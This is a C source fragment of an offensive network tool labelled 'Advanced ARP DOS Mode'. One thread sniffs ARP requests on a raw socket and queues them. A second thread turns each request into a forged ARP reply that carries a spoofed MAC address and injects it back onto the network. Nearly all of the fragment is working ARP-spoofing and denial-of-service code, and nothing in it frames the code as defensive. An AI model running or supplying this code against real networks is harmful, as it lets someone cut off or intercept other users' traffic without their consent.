/*IPC*/
#define PATHNAME_FTOK 	"/etc/services"
#define PROJ_ID_FTOK	1
#define PERMISSION		0644

struct message {
	long mtype;
	unsigned char *pkt;
};

int CreateMsgQu (void) {
	int msgq;
	key_t key;

	if ((key = ftok(PATHNAME_FTOK, PROJ_ID_FTOK)) == -1) {
		perror("FTOK");
		exit(-1);
	}

	if ((msgq = msgget(key, PERMISSION | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(-1);
	}

	return msgq;
}

void SendMsg (int msgq, struct message buff) {
	if (msgsnd(msgq, &buff, sizeof(struct message), 0) == -1) {
		perror("msgsnd");
		exit(-1);
	}
}

struct message *ReceiveMsg (int msgq) {
	struct message *buff;

	buff = (struct message *)malloc(sizeof(struct message));
	if (msgrcv(msgq, buff, sizeof(struct message), 0, 0) == -1) {
		perror("msgrcv");
		free(buff);
		buff = NULL;
	}
	return buff;
}

void DestroyMsgQ (int msgq) {
	if (msgctl(msgq, IPC_RMID, NULL) == -1) {
		perror("msgctl");
	}
}

int SendRawPacket (int sockfd, void *buff, int len) {
	int slen;

	if ((slen = write(sockfd, buff, len)) != len) {
		printf("Sent %d bytes\n", slen);
		return 0;
	}
	return 1;
}
/*Advanced ARP DOS Mode*/

void *SnifferThread (void *arg) {
	int raw, len, pkt_len;
	unsigned char pkt_buff[2048], *pkt;
	struct sockaddr_ll sll;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	struct message buff;
	
	int msgq = *((int *)arg);
	pkt_len = sizeof(sll);

	/*Create Raw Socket*/
	raw = CreateRawSocket(ETH_P_ARP);
	BindToInterface(raw, device, ETH_P_ARP);

	/*Loop until user terminate*/
	while (1) {
		bzero(pkt_buff, 2048);

		if ((len = recvfrom(raw, pkt_buff, 2048, 0, (struct sockaddr *)&sll, (socklen_t *)&pkt_len)) == -1) {
			perror("recvfrom");
			exit(1);
		}else if (len < sizeof(struct ethernet_header) + sizeof(struct arp_header)) {
			printf("Packet is too small\n");
			continue;
		}else {
			/*Packet reveived successfully*/
			ethhdr = (struct ethernet_header *)pkt_buff;
				
			if (ethhdr->pro == htons(ETH_P_ARP)) {	/*is arp packet*/
				arphdr = (struct arp_header *)(pkt_buff + sizeof(struct ethernet_header));

				if (arphdr->opcode == htons(ARPOP_REQUEST)) {/*is requst*/
					struct in_addr tmpaddr;
					////tmpaddr.s_addr = (in_addr_t)arphdr->spa;
					memcpy(&(tmpaddr.s_addr), arphdr->spa, 4);
					printf("Sniffer: ARP REQ from MAC %s IP %s", ether_ntoa(arphdr->sha), inet_ntoa(tmpaddr));

					/*Send packet to MSGQ for Injector*/
					pkt = (unsigned char *)malloc(len);
					memcpy(pkt, pkt_buff, len);

					/**/
					buff.mtype = 1;
					buff.pkt = pkt;

					/*Send*/
					SendMsg(msgq, buff);
				}
			}
		}
	}
	close(raw);
}

/*Injection Thread*/
//#define SPOOFED_MAC "a2:34:de:45:11:ff"
void *InjectionThread (void *arg) {
	int raw;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	//unsigned char *pkt;
	
	int msgq = *((int *)arg);
	struct message *buff;
	unsigned char tmp[6];

	raw = CreateRawSocket(ETH_P_ALL);
	BindToInterface(raw, device, ETH_P_ALL);

	while (1) {
		buff = ReceiveMsg (msgq);

		if (buff) {	/*Get msg*/
			ethhdr = (struct ethernet_header *)(buff->pkt);
			arphdr = (struct arp_header *)(buff->pkt + sizeof(struct ethernet_header));

			/*CHange Ethernet headers*/

			memcpy(ethhdr->dst, ethhdr->src, 6);

			memcpy(ethhdr->src, (void *)ether_aton(SPOOFED_MAC), 6);

			/*Change ARP Headers*/

			arphdr->opcode = htons(ARPOP_REPLY);

			memcpy(tmp, arphdr->sha, 6);
			memcpy(arphdr->sha, (void *)ether_aton(SPOOFED_MAC), 6);
			memcpy(arphdr->tha, tmp, 6);

			memcpy(tmp, arphdr->spa, 4);
			memcpy(arphdr->spa, arphdr->tpa, 4);
			memcpy(arphdr->tpa, tmp, 4);

			/*Injection*/
			if (SendRawPacket(raw, buff->pkt, sizeof(struct ethernet_header) + sizeof(struct arp_header))) {
				printf(" Injection Successfully\n");
			}else {
				printf(" Injection Error\n");
			}
			
			free(buff->pkt);
			free(buff);
		}
	}
	close(raw);
}
